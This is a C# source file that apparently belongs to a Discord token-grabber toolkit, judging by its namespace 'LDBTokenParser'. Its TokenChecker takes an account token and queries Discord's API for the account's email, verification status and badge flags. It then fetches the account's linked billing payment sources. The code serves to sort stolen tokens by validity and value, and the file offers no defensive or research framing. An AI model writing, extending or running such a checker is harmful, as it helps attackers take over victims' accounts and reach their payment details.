using System;
using System.Collections.Generic;
using System.Net.Http;
using System.Threading.Tasks;
using Newtonsoft.Json;

namespace LDBTokenParser.Checker
{
    [Flags] public enum UserFlags
    {
        Mod = 262144,
        Hypesquad = 4,
        EarlySupporter = 512,
        BotDeveloper = 131072,
        Partner = 2,
        BugHunterGreen = 8,
        BugHunterGold = 16384
    }

    public struct MeResponse
    {
        
        [JsonProperty("username")] public string Username { get; set; }
        [JsonProperty("discriminator")] public int Discriminator { get; set; }
        [JsonProperty("email")] public string Email { get; set; }
        [JsonProperty("verified")] public bool Verified { get; set; }
        [JsonProperty("flags")] public UserFlags UserFlags;
        [JsonProperty("id")] public string Id { get; set; }
    }

    public struct PaymentSource
    {
        [JsonProperty("id")] public string Id { get; set; }
    }

  

    public struct Response
    {
        public bool Valid { get; set; }
        public MeResponse Me { get; set; }
        public List<PaymentSource> PaymentSources { get; set; }

    }
    

    public class TokenChecker
    {
        public static async Task<Response> CheckToken(string token)
        {
            //Ну если шо я сонный спидранер
            var client = new HttpClient();
            client.DefaultRequestHeaders.Add("Authorization", token);

            var meMessage = await client.GetAsync("https://discord.com/api/v9/users/@me");

            if (!meMessage.IsSuccessStatusCode)
            {
#if DEBUG
                Console.WriteLine(await meMessage.Content.ReadAsStringAsync());
#endif
                return new Response
                {
                    Valid = false
                };
            }

            var meBody = JsonConvert.DeserializeObject<MeResponse>(await meMessage.Content.ReadAsStringAsync());

            var paymentSourcesMessage = await client.GetAsync("https://discord.com/api/v9/users/@me/billing/payment-sources");

            if (!paymentSourcesMessage.IsSuccessStatusCode)
            {
                return new Response
                {
                    Valid = false,
                    Me = meBody,
                    PaymentSources = new List<PaymentSource>()
                };
            }

            var paymentSources = JsonConvert.DeserializeObject<List<PaymentSource>>(await paymentSourcesMessage.Content.ReadAsStringAsync());

            return new Response
            {
                Me = meBody,
                Valid = true,
                PaymentSources = paymentSources
            };
        }
     
        
    }
}